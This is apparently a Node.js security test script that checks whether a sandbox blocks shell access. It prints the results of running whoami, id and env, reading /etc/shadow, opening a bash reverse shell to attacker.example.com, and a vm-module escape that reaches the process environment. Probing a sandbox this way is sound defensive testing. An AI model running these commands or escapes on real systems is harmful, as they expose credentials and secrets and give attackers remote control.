// SECURITY TEST: Jailbreak via child_process / require('child_process')
const { execSync, spawnSync } = require('child_process');
const fs = require('fs');

function probe(label, fn) {
    console.log(`=== ${label} ===`);
    try {
        const result = fn();
        console.log(result !== undefined ? result : 'SUCCESS - not blocked');
    } catch (e) {
        console.log(`BLOCKED: ${e.message}`);
    }
}

probe('whoami', () => execSync('whoami', { timeout: 3000 }).toString().trim());
probe('id', () => execSync('id', { timeout: 3000 }).toString().trim());
probe('cat /etc/shadow', () => fs.readFileSync('/etc/shadow', 'utf8'));
probe('env dump', () => execSync('env', { timeout: 3000 }).toString());
probe('reverse shell', () =>
    spawnSync('bash', ['-c', 'bash -i >& /dev/tcp/attacker.example.com/4444 0>&1'], { timeout: 3000 })
);

// VM module escape attempt (Node.js sandbox bypass)
probe('vm escape', () => {
    const vm = require('vm');
    const ctx = vm.createContext({});
    return vm.runInContext(
        'this.constructor.constructor("return process")().env',
        ctx
    );
});
